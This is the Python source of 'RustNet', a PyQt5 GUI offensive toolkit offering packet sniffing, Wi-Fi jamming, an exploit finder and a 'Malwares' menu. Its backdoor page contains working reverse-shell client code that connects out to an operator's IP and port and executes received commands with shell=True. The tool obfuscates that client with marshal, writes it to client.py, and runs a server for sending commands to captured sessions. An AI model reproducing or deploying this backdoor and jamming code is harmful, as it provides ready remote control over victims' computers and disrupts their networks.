from scapy.layers.l2 import *
from scapy.layers.inet import *
from scapy.all import *
from scapy.layers.dot11 import *
import wifi
import psutil
from ipaddress import *
import netifaces
import marshal

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from plugins.network.Jamming.jamming_page import JammingThread
from plugins.network.Sniffing.sniffing_page import SniffThread
from plugins.network.functions import interfaces_list, devices_list
from plugins.web.ExploitFinder.core.exploit_finder import FinderThread
from plugins.malwares.backdoor.backdoor_page import BackdoorServer

from qdarkstyle import load_stylesheet_pyqt5
import sys

class RustNetApp(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("RustNet - Manage your Technologey world")
        self.setGeometry(100, 100, 800, 600)

        self.current_interface = ""
        self.connected_network = ""
        self.router_ip = ""
        self.broadcast_addr = ""
        self.sniff_thread = None
        self.jamming_thread = None
        self.exploit_finder_thread = None
        self.backdoor_server = BackdoorServer()
        self.selected_session = None
        self.sessions_combobox = None

        self.session_update_timer = QTimer(self)
        self.session_update_timer.timeout.connect(self.update_sessions)
        self.session_update_timer.start(1000)

        self.setup_ui()

    def setup_ui(self):
        self.central_layout = QVBoxLayout(self)

        splash_label = QLabel("RustNet", self)
        splash_label.setAlignment(Qt.AlignCenter)
        splash_label.setStyleSheet("font-size: 36px; font-weight: bold; color: #3498db")  
        self.central_layout.addWidget(splash_label)

        description = QLabel("Let's manage your Technologey world", self)
        description.setAlignment(Qt.AlignBottom | Qt.AlignCenter)
        description.setStyleSheet("font-size: 20px; color: #2ecc71")  
        self.central_layout.addWidget(description)

        start_button = QPushButton("Network", self)
        start_button.clicked.connect(self.show_interface_screen)
        start_button.setStyleSheet("background-color: #e74c3c; color: #fff")  
        self.central_layout.addWidget(start_button)

        web_button = QPushButton("Web", self)
        web_button.clicked.connect(self.show_web_page)
        web_button.setStyleSheet("background-color: #9b59b6; color: #fff")
        self.central_layout.addWidget(web_button)

        malwares_button = QPushButton("Malwares", self)
        malwares_button.clicked.connect(self.show_malwares_page)
        malwares_button.setStyleSheet("background-color: #27ae60; color: #fff")
        self.central_layout.addWidget(malwares_button)

        self.setStyleSheet(load_stylesheet_pyqt5())

        self.apply_animations(splash_label)
        self.apply_animations(description)
        self.apply_animations(start_button)
        self.apply_animations(web_button)
        self.apply_animations(malwares_button)

    def apply_animations(self, widget):
        fade_in_animation = QPropertyAnimation(widget, b"opacity")
        fade_in_animation.setStartValue(0.0)
        fade_in_animation.setEndValue(1.0)
        fade_in_animation.setDuration(1000)
        fade_in_animation.setEasingCurve(QEasingCurve.OutBack)
        fade_in_animation.start()
    
    def show_malwares_page(self):
        self.clear_layout()

        malwares_layout = QVBoxLayout()

        web_label = QLabel("Malwares", self)
        web_label.setAlignment(Qt.AlignCenter)
        web_label.setStyleSheet("font-size: 36px; font-weight: bold; color: #3498db")  
        malwares_layout.addWidget(web_label)

        description = QLabel("Let's manage your Malwares", self)
        description.setAlignment(Qt.AlignBottom | Qt.AlignCenter)
        description.setStyleSheet("font-size: 20px; color: #2ecc71")  
        malwares_layout.addWidget(description)

        backdoor_button = QPushButton("Backdoor", self)
        backdoor_button.clicked.connect(self.show_backdoor_page)
        backdoor_button.setStyleSheet("background-color: #8c1b00; color: #fff")
        malwares_layout.addWidget(backdoor_button)

        self.central_layout.addLayout(malwares_layout)

    def show_web_page(self):
        self.clear_layout()

        malwares_layout = QVBoxLayout()

        web_label = QLabel("Web", self)
        web_label.setAlignment(Qt.AlignCenter)
        web_label.setStyleSheet("font-size: 36px; font-weight: bold; color: #3498db")  
        malwares_layout.addWidget(web_label)

        description = QLabel("Let's manage your web", self)
        description.setAlignment(Qt.AlignBottom | Qt.AlignCenter)
        description.setStyleSheet("font-size: 20px; color: #2ecc71")  
        malwares_layout.addWidget(description)

        vuln_finder_button = QPushButton("Exploit finder", self)
        vuln_finder_button.clicked.connect(self.show_exploit_finder_page)
        vuln_finder_button.setStyleSheet("background-color: #e74c3c; color: #fff")  
        malwares_layout.addWidget(vuln_finder_button)

        exploit_vuln_button = QPushButton("Exploit vuln", self)
        exploit_vuln_button.clicked.connect(self.show_exploit_vuln_page)
        exploit_vuln_button.setStyleSheet("background-color: #9b59b6; color: #fff")
        malwares_layout.addWidget(exploit_vuln_button)

        self.central_layout.addWidget(web_label)
        self.central_layout.addWidget(description)
        self.central_layout.addWidget(vuln_finder_button)
        self.central_layout.addWidget(exploit_vuln_button)

    def show_exploit_vuln_page(self):
        QMessageBox.information(self, "Updates", "Soon ...", QMessageBox.Ok)
    
    def show_exploit_finder_page(self):
        self.clear_layout()
        finder_layout = QVBoxLayout()

        web_dialog = QDialog(self)
        web_dialog.setWindowTitle("RustNet - Vuln finder")

        keyword_input = QLineEdit()
        keyword_input.setPlaceholderText("Exploit name")
        finder_layout.addWidget(keyword_input)

        txt_output_checkbox = QCheckBox("Generate txt output file", web_dialog)
        html_output_checkbox = QCheckBox("Generate html output file", web_dialog)

        finder_layout.addWidget(txt_output_checkbox)
        finder_layout.addWidget(html_output_checkbox)

        ok_button = QPushButton("OK", web_dialog)
        ok_button.clicked.connect(web_dialog.accept)
        finder_layout.addWidget(ok_button)

        web_dialog.setLayout(finder_layout)

        if web_dialog.exec_() == QDialog.Accepted:
            self.keywords = keyword_input.text()
            self.generate_txt_output = txt_output_checkbox.isChecked()
            self.generate_html_output = html_output_checkbox.isChecked()            

        self.exploit_finder_text = QTextEdit(self)
        self.exploit_finder_text.setReadOnly(True)
        finder_layout.addWidget(self.exploit_finder_text)

        start_button = QPushButton("Start", self)
        start_button.clicked.connect(lambda: self.start_exploit_finder(self.keywords, self.generate_txt_output, self.generate_html_output))
        start_button.setStyleSheet("background-color: #3498db; color: #fff") 
        finder_layout.addWidget(start_button)

        self.central_layout.addWidget(web_dialog)
        self.central_layout.addWidget(self.exploit_finder_text)
        self.central_layout.addWidget(start_button)
    
    def show_backdoor_page(self):
        self.clear_layout()

        backdoor_layout = QVBoxLayout()

        web_dialog = QDialog(self)
        web_dialog.setWindowTitle("RustNet - Payload info")

        ip_input = QLineEdit()
        ip_input.setPlaceholderText("Enter IP")
        backdoor_layout.addWidget(ip_input)

        port_input = QLineEdit()
        port_input.setPlaceholderText("Enter Port")
        backdoor_layout.addWidget(port_input)        

        ok_button = QPushButton("OK", web_dialog)
        ok_button.clicked.connect(web_dialog.accept)
        backdoor_layout.addWidget(ok_button)

        web_dialog.setLayout(backdoor_layout)

        if web_dialog.exec_() == QDialog.Accepted:
            self.ip = ip_input.text()
            self.port = port_input.text()

        self.backdoor_text = QTextEdit(self)  
        self.backdoor_text.setReadOnly(True)
        backdoor_layout.addWidget(self.backdoor_text)

        client_source = '''
import socket
import subprocess
import os

class BackdoorClient:
    def __init__(self, server_ip, server_port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_ip, server_port))

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return result.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return str(e.stderr.decode('utf-8'))

    def start(self):
        while True:
            command = self.connection.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            elif command.lower()[:2] == 'cd':
                os.chdir(command[3:])
            else:
                command_result = self.execute_command(command)
                self.connection.send(command_result.encode('utf-8'))
        self.connection.close()

backdoor_client = BackdoorClient("<ip>", "<port>")  
backdoor_client.start()
'''
        client_source = marshal.dumps(client_source.replace("<ip>", self.ip).replace('"<port>"', self.port))
        file = open("client.py", "w").write(f'''
import marshal
exec(marshal.loads({client_source}))
''')
        start_server_button = QPushButton("Start Server", self)
        start_server_button.clicked.connect(lambda: self.start_backdoor_server(self.ip, self.port))
        start_server_button.setStyleSheet("background-color: #3498db; color: #fff")
        backdoor_layout.addWidget(start_server_button)

        exec_commands_button = QPushButton("Execute Commands", self)
        exec_commands_button.clicked.connect(self.show_exec_commands_page)
        exec_commands_button.setStyleSheet("background-color: #9b59b6; color: #fff")
        backdoor_layout.addWidget(exec_commands_button)

        self.central_layout.addWidget(web_dialog)
        self.central_layout.addWidget(self.backdoor_text)
        self.central_layout.addWidget(start_server_button)
        self.central_layout.addWidget(exec_commands_button)

    def show_exec_commands_page(self):
        self.clear_layout()

        exec_commands_layout = QVBoxLayout()

        exec_commands_text = QTextEdit(self)
        exec_commands_text.setReadOnly(True)
        exec_commands_layout.addWidget(exec_commands_text)

        sessions_label = QLabel("Available Sessions:", self)
        exec_commands_layout.addWidget(sessions_label)

        self.sessions_combobox = QComboBox(self)  
        exec_commands_layout.addWidget(self.sessions_combobox)

        command_input = QLineEdit(self)
        command_input.setPlaceholderText("Enter command")
        exec_commands_layout.addWidget(command_input)

        exec_button = QPushButton("Execute Command", self)
        exec_button.clicked.connect(lambda: self.execute_command(command_input.text(), exec_commands_text))
        exec_button.setStyleSheet("background-color: #e74c3c; color: #fff")
        exec_commands_layout.addWidget(exec_button)

        self.central_layout.addLayout(exec_commands_layout)

    def update_sessions(self):
        if self.backdoor_server is not None:
            sessions_count = len(self.backdoor_server.clients)
            if self.sessions_combobox is not None:  
                current_index = self.sessions_combobox.currentIndex()
                self.sessions_combobox.clear()
                for i in range(sessions_count):
                    self.sessions_combobox.addItem(f"Session {i}")

                if sessions_count > 0:
                    if current_index >= 0 and current_index < sessions_count:
                        self.sessions_combobox.setCurrentIndex(current_index)
                        self.selected_session = current_index + 1
                    else:
                        self.sessions_combobox.setCurrentIndex(0)
                        self.selected_session = 1
                else:
                    self.selected_session = None



    def select_session(self, index):
        self.selected_session = index 

    def execute_command(self, command, exec_commands_text):
        if self.selected_session is not None:
            try:
                client_socket, addr = self.backdoor_server.clients[self.selected_session - 1]  
                client_socket.send(command.encode('utf-8'))
                result = client_socket.recv(1024).decode('utf-8')
                if exec_commands_text is not None:
                    exec_commands_text.append(f"Session {self.selected_session} >>> {result}\n")
            except Exception as e:
                exec_commands_text.append(f"Error executing command: {str(e)}\n")
        else:
            exec_commands_text.append("No session selected. Please choose a session.\n")

    def start_backdoor_server(self, ip, port):
        try:
            self.backdoor_server.start_server(ip, port)
            self.backdoor_text.append("Backdoor server started. Waiting for connections...\n")
        except Exception as e:
            self.backdoor_text.append(f"Error starting backdoor server: {str(e)}\n")

    def show_interface_screen(self):
        self.clear_layout()
        interface_layout = QVBoxLayout()

        interface_label = QLabel("Choose Interface:", self)
        interface_layout.addWidget(interface_label)

        interfaces = self.interfaces_list()
        interface_combobox = QComboBox(self)
        interface_combobox.addItems(interfaces)
        interface_layout.addWidget(interface_combobox)

        router_ip, ok1 = QInputDialog.getText(self, 'Input', 'Enter Router IP:')

        if ok1:
            self.router_ip = router_ip

            start_button = QPushButton("Sniffing", self)
            start_button.clicked.connect(lambda: self.show_sniff_screen(interface_combobox.currentText()))
            interface_layout.addWidget(start_button)

            jamming_button = QPushButton("Jamming", self)
            jamming_button.clicked.connect(lambda: self.show_jamming_screen(interface_combobox.currentText()))
            interface_layout.addWidget(jamming_button)

            self.central_layout.addLayout(interface_layout)
        else:
            QMessageBox.warning(self, "Input Error", "Invalid input for Router IP or Broadcast Address", QMessageBox.Ok)

    def show_sniff_screen(self, interface):
        self.clear_layout()
        sniff_layout = QVBoxLayout()

        self.sniff_text = QTextEdit(self)
        self.sniff_text.setReadOnly(True)
        sniff_layout.addWidget(self.sniff_text)

        buttons_layout = QVBoxLayout()

        start_sniff_button = QPushButton("Start Sniff", self)
        start_sniff_button.clicked.connect(lambda: self.start_sniff(interface))
        start_sniff_button.setStyleSheet("background-color: #3498db; color: #fff") 
        buttons_layout.addWidget(start_sniff_button)

        stop_sniff_button = QPushButton("Stop Sniff", self)
        stop_sniff_button.clicked.connect(self.stop_sniff)
        stop_sniff_button.setStyleSheet("background-color: #e74c3c; color: #fff")  
        buttons_layout.addWidget(stop_sniff_button)

        sniff_layout.addLayout(buttons_layout)

        self.central_layout.addLayout(sniff_layout)

    def show_jamming_screen(self, interface):
        self.clear_layout()
        jamming_layout = QVBoxLayout()

        self.jamming_text = QTextEdit(self)
        self.jamming_text.setReadOnly(True)
        jamming_layout.addWidget(self.jamming_text)

        networks_label = QLabel("Choose Network to Jam:", self)
        jamming_layout.addWidget(networks_label)

        networks = self.devices_list(interface)
        networks_combobox = QComboBox(self)
        for network in networks:
            networks_combobox.addItem(f"{network[0]} - {network[1]}")
        jamming_layout.addWidget(networks_combobox)

        buttons_layout = QVBoxLayout()

        connect_button = QPushButton("Connect to Network", self)
        connect_button.clicked.connect(lambda: self.connect_to_network(networks_combobox.currentText(), interface))
        connect_button.setStyleSheet("background-color: #3498db; color: #fff")  
        buttons_layout.addWidget(connect_button)

        start_jamming_button = QPushButton("Start Jamming", self)
        start_jamming_button.clicked.connect(lambda: self.start_jamming(interface))
        start_jamming_button.setStyleSheet("background-color: #27ae60; color: #fff")  
        buttons_layout.addWidget(start_jamming_button)

        stop_jamming_button = QPushButton("Stop Jamming", self)
        stop_jamming_button.clicked.connect(self.stop_jamming)
        stop_jamming_button.setStyleSheet("background-color: #e74c3c; color: #fff")  
        buttons_layout.addWidget(stop_jamming_button)

        jamming_layout.addLayout(buttons_layout)

        self.central_layout.addLayout(jamming_layout)

        if self.jamming_thread:
            self.jamming_thread.jamming_output.connect(self.jamming_text.append)

    def connect_to_network(self, network_info, interface):
        selected_network = network_info.split(" - ")[0]
        if self.is_network_connected(interface, selected_network):
            self.connected_network = selected_network
            QMessageBox.information(self, "Connected", f"Connected to network: {selected_network}", QMessageBox.Ok)
        else:
            QMessageBox.warning(self, "Not Connected", "You must connect to the network first.", QMessageBox.Ok)

    def start_sniff(self, interface):
        self.sniff_text.clear()
        self.sniff_thread = SniffThread(interface)
        self.sniff_thread.packet_received.connect(self.handle_packet_received)
        self.sniff_thread.start()
    
    def start_exploit_finder(self, keywords, txt, html):
        self.exploit_finder_text.clear()
        self.exploit_finder_thread= FinderThread(keywords, txt, html)
        self.exploit_finder_thread.finding_output.connect(self.handle_output_received)
        self.exploit_finder_thread.start()

    def handle_packet_received(self, packet):
        self.sniff_text.append(packet)

    def handle_output_received(self, output):
        self.exploit_finder_text.append(output)

    def stop_sniff(self):
        if self.sniff_thread and self.sniff_thread.isRunning():
            self.sniff_thread.terminate()
            self.sniff_thread.wait()

    def start_jamming(self, interface):
        if self.connected_network:
            self.jamming_text.clear()
            self.jamming_thread = JammingThread(interface, self.connected_network, self.router_ip)
            self.jamming_thread.jamming_output.connect(self.jamming_text.append)
            self.jamming_thread.start()
        else:
            QMessageBox.warning(self, "Not Connected", "You must connect to a network before starting jamming.", QMessageBox.Ok)

    def stop_jamming(self):
        if self.jamming_thread and self.jamming_thread.isRunning():
            self.jamming_thread.stop_jamming()
            self.jamming_thread.wait()

    def clear_layout(self):
        while self.central_layout.count() > 0:
            item = self.central_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
            elif item.layout():
                self.clear_sub_layout(item.layout())

    def clear_sub_layout(self, layout):
        while layout.count() > 0:
            item = layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
            elif item.layout():
                self.clear_sub_layout(item.layout())

    def interfaces_list(self):
        l = []
        interfaces = psutil.net_if_addrs()

        for interface, addrs in interfaces.items():
            l.append(interface)
        return l

    def devices_list(self, interface: str):
        l = []
        networks = wifi.Cell.all(interface)
        for network in networks:
            l.append((network.ssid, network.address, network.encryption_type, network.frequency, network.signal))
        return l

    def is_network_connected(self, interface, network_name):
        try:
            networks = wifi.Cell.all(interface)
            for network in networks:
                if network.ssid == network_name:
                    return True
            return False
        except Exception as e:
            print(f"Error checking network connection: {e}")
            return False
    
    
